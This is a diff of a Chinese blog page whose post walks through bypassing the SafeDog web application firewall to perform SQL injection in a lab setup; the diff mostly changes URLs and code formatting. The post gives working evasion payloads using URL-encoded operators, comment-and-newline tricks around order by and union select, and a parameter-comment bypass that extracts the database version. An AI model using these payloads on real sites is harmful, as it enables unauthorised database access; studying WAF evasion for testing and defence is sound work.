@@ -74,7 +74,7 @@
 <meta name="description" content="绕过安全狗进行SQL注入-终极打狗棍法都9102年了还在打狗 实验环境网站安全狗v4.0.2655Apache/2.4.23PHP/5.6mysql 5.7 常规的绕过-打狗棍法第一式and 1=1和and 1=2被拦截Xor 1=1和Xor 1=2不拦截if((1=1),1,2)和if((1=2),1,2)不拦截使用%26即url编码的&amp;amp;绕过：%26%26 True和%26%26 Fal">
 <meta property="og:type" content="article">
 <meta property="og:title" content="绕过安全狗进行SQL注入-终极打狗棍法">
-<meta property="og:url" content="http://www.cuittk.cn/2019/12/02/绕过安全狗进行SQL注入/index.html">
+<meta property="og:url" content="https://blog.cuittk.cn/2019/12/02/绕过安全狗进行SQL注入/index.html">
 <meta property="og:site_name" content="h1tler&#39;s blog">
 <meta property="og:description" content="绕过安全狗进行SQL注入-终极打狗棍法都9102年了还在打狗 实验环境网站安全狗v4.0.2655Apache/2.4.23PHP/5.6mysql 5.7 常规的绕过-打狗棍法第一式and 1=1和and 1=2被拦截Xor 1=1和Xor 1=2不拦截if((1=1),1,2)和if((1=2),1,2)不拦截使用%26即url编码的&amp;amp;绕过：%26%26 True和%26%26 Fal">
 <meta property="og:locale" content="zh-Hans">
@@ -89,7 +89,7 @@
 <meta property="og:image" content="http://img.cdn.cuittk.cn/5gs7vjjhjwoh6jy1kwacsg48zd.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/cmhepscfhlb1qrs5t76jzqk273.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/d0nadn70ld817ws0cjv0knq74l.png">
-<meta property="og:updated_time" content="2019-12-02T16:59:00.659Z">
+<meta property="og:updated_time" content="2020-02-26T08:47:30.782Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="绕过安全狗进行SQL注入-终极打狗棍法">
 <meta name="twitter:description" content="绕过安全狗进行SQL注入-终极打狗棍法都9102年了还在打狗 实验环境网站安全狗v4.0.2655Apache/2.4.23PHP/5.6mysql 5.7 常规的绕过-打狗棍法第一式and 1=1和and 1=2被拦截Xor 1=1和Xor 1=2不拦截if((1=1),1,2)和if((1=2),1,2)不拦截使用%26即url编码的&amp;amp;绕过：%26%26 True和%26%26 Fal">
@@ -123,12 +123,12 @@
 
 
 
-  <link rel="canonical" href="http://www.cuittk.cn/2019/12/02/绕过安全狗进行SQL注入/"/>
+  <link rel="canonical" href="https://blog.cuittk.cn/2019/12/02/绕过安全狗进行SQL注入/"/>
 
 
 
 
-
+<link rel="stylesheet" href="/js/prism/prism.css">
   <title>绕过安全狗进行SQL注入-终极打狗棍法 | h1tler's blog</title>
   
 
@@ -266,7 +266,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2019/12/02/绕过安全狗进行SQL注入/">
+    <link itemprop="mainEntityOfPage" href="https://blog.cuittk.cn/2019/12/02/绕过安全狗进行SQL注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="h1tler">
@@ -366,13 +366,34 @@
 <p><img src="http://img.cdn.cuittk.cn/t1k9ph6v6m45npklipe2kbnr35.png" alt=""></p>
 <p><img src="http://img.cdn.cuittk.cn/tv759nh3ewd8t6lgioszqeusai.png" alt=""></p>
 <p><img src="http://img.cdn.cuittk.cn/ujf9w26n05cxfbymdizoaqw8qi.png" alt=""></p>
-<h3 id="order-by-绕过-打狗棍法第二式"><a href="#order-by-绕过-打狗棍法第二式" class="headerlink" title="order by 绕过-打狗棍法第二式"></a>order by 绕过-打狗棍法第二式</h3><h4 id="尝试order内联注释绕过"><a href="#尝试order内联注释绕过" class="headerlink" title="尝试order内联注释绕过"></a>尝试order内联注释绕过</h4><p><code>/**//*!order*//**//*!by*//**//*!1*/</code><br><img src="http://img.cdn.cuittk.cn/vt3nr0uoquu6uoj695cbgim6rm.png" alt=""></p>
+<h3 id="order-by-绕过-打狗棍法第二式"><a href="#order-by-绕过-打狗棍法第二式" class="headerlink" title="order by 绕过-打狗棍法第二式"></a>order by 绕过-打狗棍法第二式</h3><h4 id="尝试order内联注释绕过"><a href="#尝试order内联注释绕过" class="headerlink" title="尝试order内联注释绕过"></a>尝试order内联注释绕过</h4><pre><code class="language-html">/**//*!order*//**//*!by*//**//*!1*/
+</code></pre>
+<p><img src="http://img.cdn.cuittk.cn/vt3nr0uoquu6uoj695cbgim6rm.png" alt=""></p>
 <p>哈哈，失败了，都9102年，还是有长进的嘛</p>
-<h4 id="利用换行跳过注释进行绕过"><a href="#利用换行跳过注释进行绕过" class="headerlink" title="利用换行跳过注释进行绕过"></a>利用换行跳过注释进行绕过</h4><p><code>order%23a%0aby 3</code><br><code>%23</code>为#注释，<code>%0a</code>为回车符，意思是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">order#a</div><div class="line">by 3</div></pre></td></tr></table></figure></p>
-<p>也有用<code>/**/</code>替换空格的：<code>/**/order/**/%23aaaa%0a/**/by/**/3</code><br><img src="http://img.cdn.cuittk.cn/jn6heck4khiu273ssew0mwuahs.png" alt=""><br><img src="http://img.cdn.cuittk.cn/rwlp0oqs9op6iy1985wsfxvx9l.png" alt=""><br>字段数为3</p>
-<h3 id="union-select-绕过-打狗棍法第三式"><a href="#union-select-绕过-打狗棍法第三式" class="headerlink" title="union select 绕过-打狗棍法第三式"></a>union select 绕过-打狗棍法第三式</h3><p>同样是利用换行跳过注释进行绕过<br><code>id=1 %26%26False union%23a%0aselect 1,2,3</code><br><code>id=-1 union%23a%0aselect 1,2,3</code><br><img src="http://img.cdn.cuittk.cn/x74bwpdclgwg6jnd70tvo2qhby.png" alt=""><br>user()函数拦截绕过：<code>user%23a%0a()</code><br><code>id=-1 union%23a%0aselect user%23a%0a(),2,3</code><br><img src="http://img.cdn.cuittk.cn/5gs7vjjhjwoh6jy1kwacsg48zd.png" alt=""></p>
+<h4 id="利用换行跳过注释进行绕过"><a href="#利用换行跳过注释进行绕过" class="headerlink" title="利用换行跳过注释进行绕过"></a>利用换行跳过注释进行绕过</h4><pre><code class="language-html">order%23a%0aby 3
+</code></pre>
+<p><code>%23</code>为#注释，<code>%0a</code>为回车符，意思是：</p>
+<pre><code class="language-html">order#a
+by 3
+</code></pre>
+<p>也有用<code>/**/</code>替换空格的：</p>
+<pre><code class="language-html">/**/order/**/%23aaaa%0a/**/by/**/3
+</code></pre>
+<p><img src="http://img.cdn.cuittk.cn/jn6heck4khiu273ssew0mwuahs.png" alt=""><br><img src="http://img.cdn.cuittk.cn/rwlp0oqs9op6iy1985wsfxvx9l.png" alt=""><br>字段数为3</p>
+<h3 id="union-select-绕过-打狗棍法第三式"><a href="#union-select-绕过-打狗棍法第三式" class="headerlink" title="union select 绕过-打狗棍法第三式"></a>union select 绕过-打狗棍法第三式</h3><p>同样是利用换行跳过注释进行绕过</p>
+<pre><code class="language-html">id=1 %26%26False union%23a%0aselect 1,2,3
+id=-1 union%23a%0aselect 1,2,3
+</code></pre>
+<p><img src="http://img.cdn.cuittk.cn/x74bwpdclgwg6jnd70tvo2qhby.png" alt=""><br>user()函数拦截绕过：<code>user%23a%0a()</code></p>
+<pre><code class="language-html">id=-1 union%23a%0aselect user%23a%0a(),2,3
+</code></pre>
+<p><img src="http://img.cdn.cuittk.cn/5gs7vjjhjwoh6jy1kwacsg48zd.png" alt=""></p>
 <p>但是会拦截其他的关键字：<code>version</code>等，显得有些鸡肋<br><img src="http://img.cdn.cuittk.cn/cmhepscfhlb1qrs5t76jzqk273.png" alt=""></p>
-<h3 id="终极打狗棍法"><a href="#终极打狗棍法" class="headerlink" title="终极打狗棍法"></a>终极打狗棍法</h3><p>发现安全狗会把<code>/**/</code>之间的内容直接忽略掉，所以就很有意思了，例如如下链接id存在注入：<br><code>http://xxxx/index.php?id=1</code><br><code>http://xxxx/index.php?a=/*&amp;id=1 and 1=2 union select version(),2,3%23*/</code><br>想怎么注就怎么注<br><img src="http://img.cdn.cuittk.cn/d0nadn70ld817ws0cjv0knq74l.png" alt=""></p>
+<h3 id="终极打狗棍法"><a href="#终极打狗棍法" class="headerlink" title="终极打狗棍法"></a>终极打狗棍法</h3><p>发现安全狗会把<code>/**/</code>之间的内容直接忽略掉，所以就很有意思了，例如如下链接id存在注入：</p>
+<pre><code class="language-html">http://xxxx/index.php?id=1
+http://xxxx/index.php?a=/*&amp;id=1 and 1=2 union select version(),2,3%23*/
+</code></pre>
+<p>想怎么注就怎么注<br><img src="http://img.cdn.cuittk.cn/d0nadn70ld817ws0cjv0knq74l.png" alt=""></p>
 <p><strong>杀狗</strong></p>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://422926799.github.io/posts/aafbd292.html" target="_blank" rel="external">https://422926799.github.io/posts/aafbd292.html</a><br><a href="https://422926799.github.io/posts/9d8606fc.html" target="_blank" rel="external">https://422926799.github.io/posts/9d8606fc.html</a><br><a href="https://blog.csdn.net/he_and/article/details/81287008" target="_blank" rel="external">https://blog.csdn.net/he_and/article/details/81287008</a></p>
 
@@ -493,7 +514,7 @@
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -621,7 +642,7 @@
 
 
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
+<script src="/js/prism/prism.js" async></script>
         
 <div class="busuanzi-count">
   <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
